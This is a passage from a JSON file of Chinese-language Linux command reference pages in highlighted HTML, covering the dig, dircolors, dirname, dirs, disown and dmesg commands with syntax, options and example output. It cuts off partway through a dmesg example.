class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># dig www.jsdig.com</span>\n\n<span class=\"hljs-string\">;</span> <span class=\"hljs-string\">&lt;&lt;&gt;&gt;</span> <span class=\"hljs-string\">DiG</span> <span class=\"hljs-number\">9.3</span><span class=\"hljs-number\">.6</span><span class=\"hljs-string\">-P1-RedHat-9.3.6-20.P1.el5_8.1</span> <span class=\"hljs-string\">&lt;&lt;&gt;&gt;</span> <span class=\"hljs-string\">www.jsdig.com</span>\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">global options:</span>  <span class=\"hljs-string\">printcmd</span>\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">Got answer:</span>\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-string\">-&gt;&gt;HEADER&lt;&lt;-</span> <span class=\"hljs-attr\">opcode:</span> <span class=\"hljs-string\">QUERY,</span> <span class=\"hljs-attr\">status:</span> <span class=\"hljs-string\">NOERROR,</span> <span class=\"hljs-attr\">id:</span> <span class=\"hljs-number\">2115</span>\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">flags:</span> <span class=\"hljs-string\">qr</span> <span class=\"hljs-string\">rd</span> <span class=\"hljs-string\">ra;</span> <span class=\"hljs-attr\">QUERY:</span> <span class=\"hljs-number\">1</span><span class=\"hljs-string\">,</span> <span class=\"hljs-attr\">ANSWER:</span> <span class=\"hljs-number\">2</span><span class=\"hljs-string\">,</span> <span class=\"hljs-attr\">AUTHORITY:</span> <span class=\"hljs-number\">2</span><span class=\"hljs-string\">,</span> <span class=\"hljs-attr\">ADDITIONAL:</span> <span class=\"hljs-number\">0</span>\n\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">QUESTION SECTION:</span>\n<span class=\"hljs-string\">;www.jsdig.com.</span>               <span class=\"hljs-string\">IN</span>      <span class=\"hljs-string\">A</span>\n\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">ANSWER SECTION:</span>\n<span class=\"hljs-string\">www.jsdig.com.</span>        <span class=\"hljs-number\">0</span>       <span class=\"hljs-string\">IN</span>      <span class=\"hljs-string\">CNAME</span>   <span class=\"hljs-string\">host.1.jsdig.com.</span>\n<span class=\"hljs-string\">host.1.jsdig.com.</span>     <span class=\"hljs-number\">0</span>       <span class=\"hljs-string\">IN</span>      <span class=\"hljs-string\">A</span>       <span class=\"hljs-number\">100.42</span><span class=\"hljs-number\">.212</span><span class=\"hljs-number\">.8</span>\n\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">AUTHORITY SECTION:</span>\n<span class=\"hljs-string\">jsdig.com.</span>            <span class=\"hljs-number\">8</span>       <span class=\"hljs-string\">IN</span>      <span class=\"hljs-string\">NS</span>      <span class=\"hljs-string\">f1g1ns2.dnspod.net.</span>\n<span class=\"hljs-string\">jsdig.com.</span>            <span class=\"hljs-number\">8</span>       <span class=\"hljs-string\">IN</span>      <span class=\"hljs-string\">NS</span>      <span class=\"hljs-string\">f1g1ns1.dnspod.net.</span>\n\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">Query time:</span> <span class=\"hljs-number\">0</span> <span class=\"hljs-string\">msec</span>\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">SERVER:</span> <span class=\"hljs-number\">202.96</span><span class=\"hljs-number\">.104</span><span class=\"hljs-number\">.15</span><span class=\"hljs-comment\">#53(202.96.104.15)</span>\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">WHEN:</span> <span class=\"hljs-string\">Thu</span> <span class=\"hljs-string\">Dec</span> <span class=\"hljs-number\">26</span> <span class=\"hljs-number\">11</span><span class=\"hljs-string\">:14:37</span> <span class=\"hljs-number\">2013</span>\n<span class=\"hljs-string\">;;</span> <span class=\"hljs-attr\">MSG SIZE  rcvd:</span> <span class=\"hljs-number\">121</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dircolors",
        "des": "置ls命令在显示目录或文件时所用的色彩",
        "body": "<h1 id=\"dircolors\">dircolors</h1>\n<p>置ls命令在显示目录或文件时所用的色彩</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dircolors命令</strong> 设置ls命令在显示目录或文件时所用的色彩。dircolors可根据[色彩配置文件]来设置LS_COLORS环境变量或是显示设置LS_COLORS环境变量的命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dircolors</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-b或--<span class=\"hljs-keyword\">sh</span>或--bourne-<span class=\"hljs-keyword\">shell</span>：显示在Boume <span class=\"hljs-keyword\">shell</span>中，将LS_COLORS设为目前预设置的<span class=\"hljs-keyword\">shell</span>指令；\n-c或--csh或--c-<span class=\"hljs-keyword\">shell</span>：显示在C <span class=\"hljs-keyword\">shell</span>中，将LS_COLORS设为目前预设置的<span class=\"hljs-keyword\">shell</span>指令；\n-p或--<span class=\"hljs-keyword\">print</span>-database：显示预设置；\n-<span class=\"hljs-keyword\">help</span>：显示帮助；\n-<span class=\"hljs-keyword\">version</span>：显示版本信息。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定用来设置颜色的文件。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># dircolors -p</span>\n<span class=\"hljs-comment\"># Configuration file for dircolors, a utility to help you set the</span>\n<span class=\"hljs-comment\"># LS_COLORS environment variable used by GNU ls with the --color option.</span>\n<span class=\"hljs-comment\"># The keywords COLOR, OPTIONS, and EIGHTBIT (honored by the</span>\n<span class=\"hljs-comment\"># slackware version of dircolors) are recognized but ignored.</span>\n<span class=\"hljs-comment\"># Below, there should be one TERM entry for each termtype that is colorizable</span>\nTERM linux\nTERM linux-c\nTERM mach-color\nTERM console\nTERM con132x25\nTERM con132x30\nTERM con132x43\nTERM con132x60\nTERM con8<span class=\"hljs-number\">0x25</span>\nTERM con8<span class=\"hljs-number\">0x28</span>\nTERM con8<span class=\"hljs-number\">0x30</span>\nTERM con8<span class=\"hljs-number\">0x43</span>\nTERM con8<span class=\"hljs-number\">0x50</span>\nTERM con8<span class=\"hljs-number\">0x60</span>\nTERM cygwin\nTERM dtterm\nTERM putty\nTERM xterm\nTERM xterm-color\nTERM xterm-debian\nTERM rxvt\nTERM <span class=\"hljs-keyword\">screen\n</span>TERM <span class=\"hljs-keyword\">screen-bce\n</span>TERM <span class=\"hljs-keyword\">screen-w\n</span>TERM vt100\nTERM Eterm\n<span class=\"hljs-comment\"># Below are the color init strings for the basic file types. A color init</span>\n<span class=\"hljs-comment\"># string consists of one or more of the following numeric codes:</span>\n<span class=\"hljs-comment\"># Attribute codes:</span>\n<span class=\"hljs-comment\"># 00=none 01=bold 04=underscore 05=blink 07=reverse 08=concealed</span>\n<span class=\"hljs-comment\"># Text color codes:</span>\n<span class=\"hljs-comment\"># 30=black 31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 37=white</span>\n<span class=\"hljs-comment\"># Background color codes:</span>\n<span class=\"hljs-comment\"># 40=black 41=red 42=green 43=yellow 44=blue 45=magenta 46=cyan 47=white</span>\n<span class=\"hljs-keyword\">NORMAL </span><span class=\"hljs-number\">00</span> <span class=\"hljs-comment\"># global default, although everything should be something.</span>\nFILE <span class=\"hljs-number\">00</span> <span class=\"hljs-comment\"># normal file</span>\n<span class=\"hljs-keyword\">DIR </span><span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;34 # directory</span>\nLINK <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;36 # symbolic link. (If you set this to 'target' instead of a</span>\n <span class=\"hljs-comment\"># numerical value, the color is as for the file pointed to.)</span>\nFIFO <span class=\"hljs-number\">40</span><span class=\"hljs-comment\">;33 # pipe</span>\nSOCK <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35 # socket</span>\nDOOR <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35 # door</span>\n<span class=\"hljs-keyword\">BLK </span><span class=\"hljs-number\">40</span><span class=\"hljs-comment\">;33;01 # block device driver</span>\nCHR <span class=\"hljs-number\">40</span><span class=\"hljs-comment\">;33;01 # character device driver</span>\n<span class=\"hljs-keyword\">ORPHAN </span><span class=\"hljs-number\">40</span><span class=\"hljs-comment\">;31;01 # symlink to nonexistent file</span>\nSETUID <span class=\"hljs-number\">37</span><span class=\"hljs-comment\">;41 # file that is setuid (u+s)</span>\nSETGID <span class=\"hljs-number\">30</span><span class=\"hljs-comment\">;43 # file that is setgid (g+s)</span>\nSTICKY_OTHER_WRITABLE <span class=\"hljs-number\">30</span><span class=\"hljs-comment\">;42 # dir that is sticky and other-writable (+t,o+w)</span>\nOTHER_WRITABLE <span class=\"hljs-number\">34</span><span class=\"hljs-comment\">;42 # dir that is other-writable (o+w) and not sticky</span>\nSTICKY <span class=\"hljs-number\">37</span><span class=\"hljs-comment\">;44 # dir with the sticky bit set (+t) and not other-writable</span>\n<span class=\"hljs-comment\"># This is for files with execute permission:</span>\nexec <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;32</span>\n<span class=\"hljs-comment\"># List any file extensions like '.gz' or '.tar' that you would like ls</span>\n<span class=\"hljs-comment\"># to colorize below. Put the extension, a space, and the color init string.</span>\n<span class=\"hljs-comment\"># (and any comments you want to add after a '#')</span>\n<span class=\"hljs-comment\"># If you use DOS-style suffixes, you may want to uncomment the following:</span>\n<span class=\"hljs-comment\">#.cmd 01;32 # executables (bright green)</span>\n<span class=\"hljs-comment\">#.exe 01;32</span>\n<span class=\"hljs-comment\">#.com 01;32</span>\n<span class=\"hljs-comment\">#.btm 01;32</span>\n<span class=\"hljs-comment\">#.bat 01;32</span>\n.tar <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31 # archives or compressed (bright red)</span>\n.tgz <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.arj <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.taz <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.lzh <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.zip <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.z <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.Z <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.gz <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.<span class=\"hljs-keyword\">bz2 </span><span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.deb <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.rpm <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n.<span class=\"hljs-keyword\">jar </span><span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;31</span>\n<span class=\"hljs-comment\"># image formats</span>\n.<span class=\"hljs-keyword\">jpg </span><span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.<span class=\"hljs-keyword\">jpeg </span><span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.gif <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.<span class=\"hljs-keyword\">bmp </span><span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.pbm <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.pgm <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.ppm <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.tga <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.xbm <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.xpm <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.tif <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.tiff <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.png <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.mov <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.mpg <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.mpeg <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.avi <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.fli <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.gl <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.dl <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.xcf <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.xwd <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n<span class=\"hljs-comment\"># audio formats</span>\n.flac <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.mp3 <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.mpc <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.ogg <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n.wav <span class=\"hljs-number\">01</span><span class=\"hljs-comment\">;35</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "dirname",
        "des": "去除文件名中的非目录部分",
        "body": "<h1 id=\"dirname\">dirname</h1>\n<p>去除文件名中的非目录部分</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dirname命令</strong> 去除文件名中的非目录部分，仅显示与目录有关的内容。dirname命令读取指定路径名保留最后一个<code>/</code>及其后面的字符，删除其他部分，并写结果到标准输出。如果最后一个<code>/</code>后无字符，dirname 命令使用倒数第二个<code>/</code>，并忽略其后的所有字符。dirname 和 basename 通常在 shell 内部命令替换使用，以指定一个与指定输入文件名略有差异的输出文件名。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dirname</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：显示帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本号。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-tag\">dirname</span> <span class=\"hljs-comment\">//</span>\n结果为 /\n\n<span class=\"hljs-selector-tag\">dirname</span> /<span class=\"hljs-selector-tag\">a</span>/<span class=\"hljs-selector-tag\">b</span>/\n结果为：/<span class=\"hljs-selector-tag\">a</span>\n\n<span class=\"hljs-selector-tag\">dirname</span> <span class=\"hljs-selector-tag\">a</span>\n结果为 .\n\n<span class=\"hljs-selector-tag\">dirname</span> <span class=\"hljs-selector-tag\">a</span>/<span class=\"hljs-selector-tag\">b</span>\n结果为路径名 <span class=\"hljs-selector-tag\">a</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "dirs",
        "des": "显示目录堆栈。",
        "body": "<h1 id=\"dirs\">dirs</h1>\n<p>显示目录堆栈。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">dirs <span class=\"hljs-selector-attr\">[-clpv]</span> <span class=\"hljs-selector-attr\">[+N]</span> <span class=\"hljs-selector-attr\">[-N]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>显示目录堆栈。</p>\n</li>\n<li><p>清空目录堆栈。</p>\n</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c    清空目录堆栈。</span>\n<span class=\"hljs-deletion\">-l    堆栈内以~开头的目录在显示时展开。</span>\n<span class=\"hljs-deletion\">-p    将目录堆栈内的每一个目录按行显示。</span>\n<span class=\"hljs-deletion\">-v    将目录堆栈内的每一个目录按行显示并在每行前加上堆栈内的位置编号。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>+N（可选）：不带参数执行<code>dirs</code>命令显示的列表中，左起的第N个目录将被显示。（从0开始计数）</p>\n<p>-N（可选）：不带参数执行<code>dirs</code>命令显示的列表中，右起的第N个目录将被显示。（从0开始计数）</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非提供了非法选项或执行出现错误。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加目录到堆栈。</span>\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>dirs\n~\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>pushd -n ~<span class=\"hljs-regexp\">/Desktop\n~ ~/</span>Desktop\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>pushd -n ~<span class=\"hljs-regexp\">/Pictures\n~ ~/</span>Pictures ~<span class=\"hljs-regexp\">/Desktop\n[user2@pc ~]$ pushd -n ~/bin</span>\n~ ~<span class=\"hljs-regexp\">/bin ~/</span>Pictures ~<span class=\"hljs-regexp\">/Desktop\n\n# 选项和参数的示例：\n[user2@pc ~]$ dirs -l\n/home</span><span class=\"hljs-regexp\">/user2 /home</span><span class=\"hljs-regexp\">/user2/bin</span> /home/user2/Pictures /home/user2/Desktop\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>dirs -p\n~\n~<span class=\"hljs-regexp\">/bin\n~/</span>Pictures\n~<span class=\"hljs-regexp\">/Desktop\n[user2@pc ~]$ dirs -v\n 0  ~\n 1  ~/bin</span>\n <span class=\"hljs-number\">2</span>  ~<span class=\"hljs-regexp\">/Pictures\n 3  ~/</span>Desktop\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>dirs +<span class=\"hljs-number\">2</span>\n~<span class=\"hljs-regexp\">/Pictures\n[user2@pc ~]$ dirs -2\n~/bin</span>\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>dirs -c\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>dirs\n~\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的目录堆栈命令包括<code>dirs popd pushd</code>。</li>\n<li>当前目录始终是目录堆栈的顶部。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "disown",
        "des": "从当前的shell中移除作业。",
        "body": "<h1 id=\"disown\">disown</h1>\n<p>从当前的shell中移除作业。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">disown <span class=\"hljs-selector-attr\">[-h]</span> <span class=\"hljs-selector-attr\">[-ar]</span> <span class=\"hljs-selector-attr\">[jobspec ... | pid ...]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>从当前shell的作业列表中移除全部作业。</p>\n</li>\n<li><p>从当前shell的作业列表中移除指定的一到多个作业。</p>\n</li>\n<li><p>从当前shell的作业列表中移除正在运行的作业。</p>\n</li>\n<li><p>标记作业，使得它们在当前shell退出后也不会结束。</p>\n</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-h    标记每个作业标识符，这些作业将不会在shell接收到sighup信号时接收到sighup信号。</span>\n<span class=\"hljs-deletion\">-a    移除所有的作业。</span>\n<span class=\"hljs-deletion\">-r    移除运行的作业。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>jobspec（可选）：要移除的作业标识符，可以是一到多个。</p>\n<p>pid（可选）：要移除的作业对应的进程ID，可以是一到多个。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非未开启作业控制或执行出现错误。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 演示。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\nuser2@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4'</span>s password:\n<span class=\"hljs-meta\"># 此时按下ctrl+z使得交互停止。</span>\n[<span class=\"hljs-meta\">1</span>]+  Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.7</span>\nuser2@<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.7'</span>s password:\n<span class=\"hljs-meta\"># 此时按下ctrl+z使得交互停止。</span>\n[<span class=\"hljs-meta\">1</span>]+  Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.7</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] sleep <span class=\"hljs-number\">120</span> &amp;\n[<span class=\"hljs-meta\">3</span>] <span class=\"hljs-number\">28986</span>\n\n<span class=\"hljs-meta\"># 列出作业及pid信息。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -l\n[<span class=\"hljs-meta\">1</span>]- <span class=\"hljs-number\">28756</span> Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n[<span class=\"hljs-meta\">2</span>]+ <span class=\"hljs-number\">28833</span> Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.7</span>\n[<span class=\"hljs-meta\">3</span>]  <span class=\"hljs-number\">28986</span> Running                 sleep <span class=\"hljs-number\">120</span> &amp;\n\n<span class=\"hljs-meta\"># 删除运行状态的作业。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] disown -r\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -l\n[<span class=\"hljs-meta\">1</span>]- <span class=\"hljs-number\">28756</span> Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n[<span class=\"hljs-meta\">2</span>]+ <span class=\"hljs-number\">28833</span> Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.7</span>\n\n<span class=\"hljs-meta\"># 注意disown只是移除作业，并没有停止。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] pgrep -a -u user2 -f <span class=\"hljs-string\">'sleep 120'</span>\n<span class=\"hljs-number\">28986</span> sleep <span class=\"hljs-number\">120</span>\n\n<span class=\"hljs-meta\"># 删除指定的作业。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] disown %<span class=\"hljs-number\">2</span>\nbash: warning: deleting stopped job <span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">with</span> process <span class=\"hljs-keyword\">group</span> <span class=\"hljs-number\">28833</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -l\n[<span class=\"hljs-meta\">1</span>]- <span class=\"hljs-number\">28756</span> Stopped                 ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n\n<span class=\"hljs-meta\"># 注意disown只是移除作业，并没有停止。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] pgrep -a -u user2 -f <span class=\"hljs-string\">'ssh 192.168.1.7'</span>\n<span class=\"hljs-number\">28833</span> ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.7</span>\n\n<span class=\"hljs-meta\"># 删除全部作业。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] disown -a\nbash: warning: deleting stopped job <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">with</span> process <span class=\"hljs-keyword\">group</span> <span class=\"hljs-number\">28756</span>\n\n[<span class=\"hljs-meta\">user2@pc</span>] jobs -l\n\n<span class=\"hljs-meta\"># 注意disown只是移除作业，并没有停止。</span>\n[<span class=\"hljs-meta\">user2@pc</span>] pgrep -a -u user2 -f <span class=\"hljs-string\">'ssh 192.168.1.4'</span>\n<span class=\"hljs-number\">28756</span> ssh <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.1</span><span class=\"hljs-number\">.4</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 演示-h选项的作用。</span>\n[user2@pc] sleep <span class=\"hljs-number\">90</span> &amp;\n[<span class=\"hljs-number\">1</span>] <span class=\"hljs-number\">109080</span>\n\n[user2@pc] jobs -l\n[<span class=\"hljs-number\">1</span>]+ <span class=\"hljs-number\">109080</span> Running                 sleep <span class=\"hljs-number\">90</span> &amp;\n\n[user2@pc] disown -h %<span class=\"hljs-number\">1</span>\n\n[user2@pc] <span class=\"hljs-keyword\">exit</span>\n\n<span class=\"hljs-comment\"># 此时前一个终端已经关闭，现在打开新终端查找该作业。</span>\n[user2@pc] pgrep -a -u user2 -f <span class=\"hljs-string\">'sleep 90'</span>\n<span class=\"hljs-number\">109080</span> sleep <span class=\"hljs-number\">90</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的作业控制命令包括<code>bg fg kill wait disown suspend</code>。</li>\n<li>该命令需要<code>set</code>选项<code>monitor</code>处于开启状态时才能执行；查看作业控制状态：输入<code>set -o</code>查看<code>monitor</code>行；执行<code>set -o monitor</code>或<code>set -m</code>开启该选项。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<h3 id=\"参考链接\">参考链接</h3>\n<ul>\n<li><a href=\"https://www.cyberciti.biz/faq/unix-linux-disown-command-examples-usage-syntax/\">disown的用法</a></li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "dmesg",
        "des": "显示Linux系统启动信息",
        "body": "<h1 id=\"dmesg\">dmesg</h1>\n<p>显示Linux系统启动信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dmesg命令</strong> 被用于检查和控制内核的环形缓冲区。kernel会将开机信息存储在ring&nbsp;buffer中。您若是开机时来不及查看信息，可利用dmesg来查看。开机信息保存在<code>/var/log/dmesg</code>文件里。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">dmesg</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c：显示信息后，清除ring buffer中的内容；</span>\n<span class=\"hljs-deletion\">-s&lt;缓冲区大小&gt;：预设置为8196，刚好等于ring buffer的大小；</span>\n<span class=\"hljs-deletion\">-n：设置记录信息的层级。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># dmesg | head</span>\nLinux version <span class=\"hljs-number\">2</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">18</span><span class=\"hljs-number\">-348</span>.<span class=\"hljs-number\">6</span>.<span class=\"hljs-number\">1</span>.el5 (mockbuild@<span class=\"hljs-keyword\">builder17.centos.org) </span>(gcc version <span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span> <span class=\"hljs-number\">20080704</span> (Red Hat <span class=\"hljs-number\">4</span>.<span class=\"hljs-number\">1</span>.<span class=\"hljs-number\">2</span><span class=\"hljs-number\">-54</span>)) <span class=\"hljs-comment\">#1 SMP Tue May 21 15:34:22 EDT 2013</span>\n<span class=\"hljs-keyword\">BIOS-provided </span>physical RAM map:\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">0000000000010000</span> - <span class=\"hljs-number\">000000000009</span>f400 (usable)\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">000000000009</span>f400 - <span class=\"hljs-number\">00000000000</span>a0000 (reserved)\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">00000000000</span>f0000 - <span class=\"hljs-number\">0000000000100000</span> (reserved)\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">0000000000100000</span> - <span class=\"hljs-number\">000000007</span>f590000 (usable)\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">000000007</span>f590000 - <span class=\"hljs-number\">000000007</span>f5e3000 (ACPI NVS)\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">000000007</span>f5e3000 - <span class=\"hljs-number\">000000007</span>f<span class=\"hljs-symbol\">5f</span>0000 (ACPI data)\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">000000007</span>f<span class=\"hljs-symbol\">5f</span>0000 - <span class=\"hljs-number\">000000007</span>f600000 (reserved)\n <span class=\"hljs-keyword\">BIOS-e820: </span><span class=\"hljs-number\">00000000</span>e0000000 - <span class=\"hljs-number\">00000000</span>e8000000 